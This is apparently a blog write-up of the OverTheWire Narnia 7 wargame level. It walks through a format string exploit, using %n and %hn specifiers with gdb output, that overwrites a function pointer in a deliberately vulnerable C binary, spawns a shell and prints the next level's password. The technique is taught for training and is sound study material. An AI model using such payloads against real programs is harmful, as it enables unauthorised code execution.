---
title: "Narnia 7 - OverTheWire"
description: "Overwriting using format string vulnerabilities"
categories: [Writeup]
tags: [narnia, overthewire, binary_exploitation, exploitation, ctf, wargame]
pubDate: 2021-04-21T22:08:02+03:00
draft: false

resources:
- name: featured-image
  src: featured-image.jpg
---

# Narnia 7 - OverTheWire

## Intro

This level is kind of a combination of the previous two Levels. You have to overwrite a function
pointer, but you have to do it using a format string vulnerability there is no overflowing
this time.

Now Let's run the program see what it does.

```
narnia7@narnia:/narnia$ ./narnia7
Usage: ./narnia7 <buffer>
narnia7@narnia:/narnia$
```

The program asks us for an input.

```
narnia7@narnia:/narnia$ ./narnia7 AAAA
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd628)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@narnia:/narnia$
```

After we give it our input it prints the address of two function, and the address of a 
pointer pointing to one of the functions, `goodfunction`. But our input is not being 
reflected which means we can not debug our input properly.

{{< highlight c >}}
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
            fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
            exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
        fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
{{< /highlight >}}

## Analysis

The `main` function calls `vuln` with the `argv[1]`, which is the input we supplied, and the
`vuln` function copies it to a stack buffer by using the `snprintf` function which limits
our input size but in the wrong way. Since our input is being passed as a format parameter
we can exploit this. The `vuln` function also copies the address of `goodfunction` to the
`ptrf` pointer and calls it. There is also the `hackedfunction` which if we manage to call
it will spawn a shell for us. 

If we can overwrite what is on the `ptrf` pointer with the address of the `hackedfunction`
we can get a shell.

We are a bit unlucky this time we don't have our input printed back to us which means we will
have to use `gdb` to debug the program.

First I want to know which parameter overflows to our string. To do that I try to print what
ever the `%s` format parameter can find, and if it finds my input it will try to dereference 
`0x41414141` which I think is not a valid address and the program will crash.

First try

```
narnia7@narnia:/narnia$ ./narnia7 "AAAA%s"
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd618)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@narnia:/narnia$
```

The program didn't crash second try.

```
narnia7@narnia:/narnia$ ./narnia7 "AAAA%x%s"
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd618)
I guess you want to come to the hackedfunction...
Segmentation fault
narnia7@narnia:/narnia$
```

Yes, the program crashed which means the second format parameter is where our program starts
to read from. We can confirm this with `gdb`.

To confirm this what we are going to do is, try to overwrite the `ptrf` function and see if 
the program crash.

Fist let's set a break point after the `snprintf` function and inspect the stack. I will
also run the program without any format parameters in the beginning to get the address of `ptrf`.

```
(gdb) run AAAA
Starting program: /narnia/narnia7 AAAA
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd5f8)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x080486b2 in vuln ()
```

Now that we have the address of `ptrf` let's try to overwrite.

```
(gdb) run "$(echo -en "\xf8\xd5\xff\xff")%08x%n"
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia7 "$(echo -en "\xf8\xd5\xff\xff")%08x%n"
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd5f8)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x080486b2 in vuln ()
(gdb) x/wx 0xffffd5f8
0xffffd5f8:     0x0000000c
```

Yes overwritten and if we try to continue the execution we get a segfult.

```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000c in ?? ()
(gdb)
```

## Exploiting

Now for the next part we don't need to overwrite each byte, or write 2 half words. If you look
closely to the two functions `goodfunction` and `hackedfunction` both share the same value
in the first half i.e. they both have `0x0804` in the first part of their address we just
have to overwrite the second half and we are done. 

In format strings when you use the `%n` it writes `4` bytes to the address given to it. But
there are length modifiers which can specify how much bytes to write. From the manpage.

```md
...
Length modifier
   Here, "integer conversion" stands for d, i, o, u, x, or X conversion.

   hh     A following integer conversion corresponds to a signed char or unsigned char ar‐
          gument,  or  a  following n conversion corresponds to a pointer to a signed char
          argument.

   h      A following integer conversion corresponds to a short or  unsigned  short  argu‐
          ment, or a following n conversion corresponds to a pointer to a short argument.

   l      (ell)  A following integer conversion corresponds to a long or unsigned long ar‐
          gument, or a following n conversion corresponds to a pointer to a long argument,
          or  a  following c conversion corresponds to a wint_t argument, or a following s
          conversion corresponds to a pointer to wchar_t argument.

   ll     (ell-ell).  A following integer conversion corresponds to a  long  long  or  un‐
          signed  long long argument, or a following n conversion corresponds to a pointer
          to a long long argument.

   q      A synonym for ll.  This is a nonstandard extension, derived from BSD; avoid  its
          use in new code.
...
```

We are going to use `h` which states that the integer conversion will be `short` or `unsigned short`
and a `short` is 2-bytes, it actually depends on each system but in our case it's 2-bytes.
Let's test it out.

```
(gdb) run $(echo -en "\x28\xd6\xff\xff")%08x%hn
Starting program: /narnia/narnia7 $(echo -en "\x28\xd6\xff\xff")%08x%hn
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd628)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x080486b2 in vuln ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0804000c in ?? ()
```

It works now it's just a matter of writing the right address and we are done. We want the other
half to be `0x8724` which is `34596` in decimal, but we have already written `0x000c` which
means we have to account for it by subtracting it `0x8724 - 0x000c` we also have to add 
`8` in decimal because of the `%08`, and finally we have `0x8724 - 0x000c + 8 = 34592` . Let's
try it out.

```
(gdb) run $(echo -en "\x18\xd6\xff\xff")%34592x%hn
Starting program: /narnia/narnia7 $(echo -en "\x18\xd6\xff\xff")%34592x%hn
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd618)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x080486b2 in vuln ()
```

Seems like it worked let's examine what's on `ptrf`

```
(gdb) x/wx 0xffffd618
0xffffd618:     0x08048724
```

The address of `hackedfunction` has been written successfully. If we continue the execution
we should get a shell and indeed we get a shell.

```
(gdb) c
Continuing.
Way to go!!!!$
$
```

Now let's try it outside of `gdb`.

```
narnia7@narnia:/narnia$ ./narnia7 $(echo -en "\x58\xd6\xff\xff")%34592x%hn
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd658)
I guess you want to come to the hackedfunction...
Way to go!!!!$
$ cat /etc/narnia_pass/narnia8
mohthuphog
$
```

Running it the first time nothing happened, because the address have chagned
I just changed the address and it worked.

And as always thanks for reading :)
